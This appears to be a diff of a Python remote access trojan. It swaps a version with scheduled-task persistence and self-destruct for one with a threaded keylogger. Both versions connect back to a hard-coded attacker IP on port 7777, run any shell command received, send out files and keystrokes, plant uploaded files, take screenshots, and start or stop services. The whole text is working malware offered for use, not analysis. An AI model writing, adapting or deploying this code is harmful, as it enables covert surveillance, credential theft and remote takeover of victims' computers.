@@ -1,198 +1,181 @@
 import socket
 import subprocess
 import os
-import tempfile
-import logging
-import sys
-import time
-import platform
 import base64
-import shutil
-import pyautogui
 from pynput import keyboard
-import psutil  # For process listing and system shutdown
+import threading
+import pyautogui
 
-# Configure logging
-logging.basicConfig(filename='persistence.log', level=logging.INFO, format='%(asctime)s - %(message)s')
-logging.basicConfig(filename=os.path.join(os.environ["appdata"], "keylogs.log"), level=logging.INFO, format='%(asctime)s - %(message)s')
-logging.basicConfig(filename='screenshot.log', level=logging.INFO)
+# Define the attacker's IP address and port
+ATTACKER_IP = '159.65.152.59'  # Replace with the attacker's IP address
+ATTACKER_PORT = 7777            # Replace with the attacker's listening port
 
-def persist():
-    try:
-        file_location = os.path.join(os.environ["appdata"], "windows32.exe")
-        if not os.path.exists(file_location):
-            shutil.copyfile(sys.executable, file_location)
-            logging.info(f"File copied to {file_location}")
-            result = subprocess.run(
-                ['schtasks', '/create', '/sc', 'onlogon', '/tn', 'Windows32', '/tr', file_location],
-                capture_output=True, text=True, shell=True
-            )
-            if result.returncode == 0:
-                logging.info("Scheduled task created successfully.")
-            else:
-                logging.error(f"Failed to create scheduled task. Error: {result.stderr}")
-    except Exception as e:
-        logging.error(f"Error setting up persistence: {str(e)}")
+# Global variable to store keystrokes
+keystrokes = []
 
 def on_press(key):
     try:
-        if hasattr(key, 'char') and key.char:
-            logging.info(f"{key.char}")
-        elif key == keyboard.Key.space:
-            logging.info(" ")
-        elif key == keyboard.Key.enter:
-            logging.info("\n")
-        elif key == keyboard.Key.backspace:
-            logging.info("[BACKSPACE]")
-        elif key == keyboard.Key.tab:
-            logging.info("[TAB]")
-        elif key == keyboard.Key.esc:
-            logging.info("[ESC]")
-        elif key == keyboard.Key.shift:
-            logging.info("[SHIFT]")
-        elif key == keyboard.Key.ctrl:
-            logging.info("[CTRL]")
-        elif key == keyboard.Key.alt:
-            logging.info("[ALT]")
-        else:
-            logging.info(f"[{key.name}]")
-    except Exception as e:
-        logging.error(f"Error logging key {key}: {str(e)}")
+        keystrokes.append(key.char)
+    except AttributeError:
+        keystrokes.append(f"[{key.name}]")
 
-def start_keylogger():
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
+def keylogger():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
-def capture_screenshot():
+def open_notepad_with_text(text):
+    temp_file = "temp.txt"
+    with open(temp_file, "w") as file:
+        file.write(text)
+    subprocess.Popen(["notepad.exe", temp_file])
+
+def capture_screenshot(filename):
     try:
         screenshot = pyautogui.screenshot()
-        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as temp_file:
-            screenshot.save(temp_file, format="PNG")
-            temp_file_path = temp_file.name
-        with open(temp_file_path, "rb") as f:
-            screenshot_data = base64.b64encode(f.read())
-        os.remove(temp_file_path)
-        return screenshot_data
+        screenshot.save(filename)
+        return f"Screenshot saved as {filename}"
     except Exception as e:
-        logging.error(f"Error capturing screenshot: {str(e)}")
-        return None
+        return str(e)
 
-def self_destruct():
-    file_location = os.path.join(os.environ["appdata"], "windows32.exe")
-    os.remove(file_location)
-    subprocess.call('schtasks /delete /tn "Windows32" /f', shell=True)
-    sys.exit()
-
-def list_processes():
-    processes = [f"{p.name()} (PID: {p.pid})" for p in psutil.process_iter(['pid', 'name'])]
-    return "\n".join(processes)
-
-def shutdown_system():
-    subprocess.call('shutdown /s /t 1', shell=True)
-
-def list_files(directory):
+def save_keystrokes(filename):
     try:
-        files = os.listdir(directory)
-        return "\n".join(files)
+        with open(filename, "a") as file:
+            file.write(''.join(keystrokes) + '\n')
+        keystrokes.clear()  # Clear the list after saving
+        return f"Keystrokes saved to {filename}"
     except Exception as e:
-        return f"Error: {str(e)}"
+        return str(e)
 
-def change_directory(directory):
+def connect_back():
     try:
-        os.chdir(directory)
-        return f"Changed directory to {os.getcwd()}"
-    except Exception as e:
-        return f"Error: {str(e)}"
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ATTACKER_IP, ATTACKER_PORT))
+        
+        # Send basic information about the target system
+        system_info = os.name + " " + os.getenv('COMPUTERNAME')
+        s.send(system_info.encode("utf-8"))
 
-def file_details(file_path):
-    try:
-        stats = os.stat(file_path)
-        details = f"Size: {stats.st_size} bytes\n"
-        details += f"Creation Time: {time.ctime(stats.st_ctime)}\n"
-        details += f"Modification Time: {time.ctime(stats.st_mtime)}\n"
-        return details
-    except Exception as e:
-        return f"Error: {str(e)}"
+        while True:
+            # Receive the command from the attacker
+            command = s.recv(1024).decode("utf-8").strip()
 
-def command_handler(s):
-    CHUNK_SIZE = 4096
-    
-    while True:
-        try:
-            command = s.recv(2048).decode()
-            if command.lower() == "exit":
+            if command.lower() == 'exit':
                 break
-            elif command.lower() == "sysinfo":
-                sysinfo = f"OS: {platform.system()} {platform.release()}\n"
-                sysinfo += f"Hostname: {socket.gethostname()}\n"
-                sysinfo += f"User: {os.getlogin()}\n"
-                s.send(sysinfo.encode())
-            elif command.lower().startswith("listfiles"):
-                _, directory = command.split("*", 1)
-                files = list_files(directory)
-                s.send(files.encode())
-            elif command.lower().startswith("chdir"):
-                _, directory = command.split("*", 1)
-                result = change_directory(directory)
-                s.send(result.encode())
-            elif command.lower().startswith("filedetails"):
-                _, file_path = command.split("*", 1)
-                details = file_details(file_path)
-                s.send(details.encode())
-            elif command.lower().startswith("download"):
-                _, file_path = command.split("*", 1)
-                if os.path.exists(file_path):
-                    with open(file_path, "rb") as f:
-                        while True:
-                            chunk = f.read(CHUNK_SIZE)
-                            if not chunk:
-                                break
-                            s.send(base64.b64encode(chunk))
-                        s.send(b"EOF")
-                else:
-                    s.send("File not found.".encode())
-            elif command.lower().startswith("upload"):
-                _, file_path = command.split("*", 1)
-                with open(file_path, "wb") as f:
-                    while True:
-                        chunk = s.recv(CHUNK_SIZE)
-                        if chunk == b"EOF":
-                            break
-                        f.write(base64.b64decode(chunk))
-                s.send("File uploaded successfully.".encode())
-            elif command.lower() == "screenshot":
-                screenshot_data = capture_screenshot()
-                s.send(screenshot_data)
-            elif command.lower() == "selfdestruct":
-                self_destruct()
-            elif command.lower() == "listprocesses":
-                processes = list_processes()
-                s.send(processes.encode())
-            elif command.lower() == "shutdown":
-                shutdown_system()
+
+            elif command.lower().startswith('cd'):
+                try:
+                    os.chdir(command[3:])
+                    result = f"Changed directory to {os.getcwd()}"
+                except FileNotFoundError:
+                    result = "Directory not found"
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('download'):
+                try:
+                    filepath = command[9:].strip()
+                    if os.path.exists(filepath):
+                        with open(filepath, "rb") as file:
+                            encoded_file = base64.b64encode(file.read()).decode("utf-8")
+                            s.send(encoded_file.encode("utf-8"))
+                    else:
+                        s.send("File not found".encode("utf-8"))
+                except Exception as e:
+                    s.send(str(e).encode("utf-8"))
+
+            elif command.lower().startswith('upload'):
+                try:
+                    _, filename, filedata = command.split(' ')
+                    with open(filename, "wb") as file:
+                        file.write(base64.b64decode(filedata))
+                    result = f"Uploaded {filename}"
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('get_keys'):
+                try:
+                    _, filename = command.split(' ', 1)
+                    result = save_keystrokes(filename)
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('open_notepad'):
+                try:
+                    _, text = command.split(' ', 1)
+                    open_notepad_with_text(text)
+                    result = "Notepad opened with text"
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('screenshot'):
+                try:
+                    _, filename = command.split(' ', 1)
+                    result = capture_screenshot(filename)
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('run'):
+                try:
+                    _, cmd = command.split(' ', 1)
+                    result = subprocess.getoutput(cmd)
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('list_files'):
+                try:
+                    _, directory = command.split(' ', 1)
+                    result = '\n'.join(os.listdir(directory))
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower() == 'get_system_info':
+                try:
+                    info = f"OS: {os.name}, Computer: {os.getenv('COMPUTERNAME')}"
+                    s.send(info.encode("utf-8"))
+                    continue
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('execute_script'):
+                try:
+                    _, script_path = command.split(' ', 1)
+                    with open(script_path, 'r') as file:
+                        script = file.read()
+                    result = subprocess.getoutput(f"python -c \"{script}\"")
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('start_service'):
+                try:
+                    _, service_name = command.split(' ', 1)
+                    result = subprocess.getoutput(f"sc start {service_name}")
+                except Exception as e:
+                    result = str(e)
+
+            elif command.lower().startswith('stop_service'):
+                try:
+                    _, service_name = command.split(' ', 1)
+                    result = subprocess.getoutput(f"sc stop {service_name}")
+                except Exception as e:
+                    result = str(e)
+
             else:
-                output = subprocess.getoutput(command)
-                if not output:
-                    output = "Command executed."
-                s.send(output.encode())
-        except Exception as e:
-            s.send(f"Error: {str(e)}".encode())
-            continue
-
-def main():
-    persist()
-    start_keylogger()
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while True:
-        try:
-            s.connect(("159.65.152.59", 7777))
-            break
-        except:
-            time.sleep(5)
-
-    command_handler(s)
-    s.close()
+                try:
+                    result = subprocess.getoutput(command)
+                except Exception as e:
+                    result = str(e)
+                
+            s.send(result.encode("utf-8"))
+        
+    except Exception as e:
+        s.send(str(e).encode("utf-8"))
+    finally:
+        s.close()
 
 if __name__ == "__main__":
-    main()
+    # Start the keylogger in a separate thread
+    keylogger_thread = threading.Thread(target=keylogger)
+    keylogger_thread.daemon = True
+    keylogger_thread.start()
+
+    connect_back()
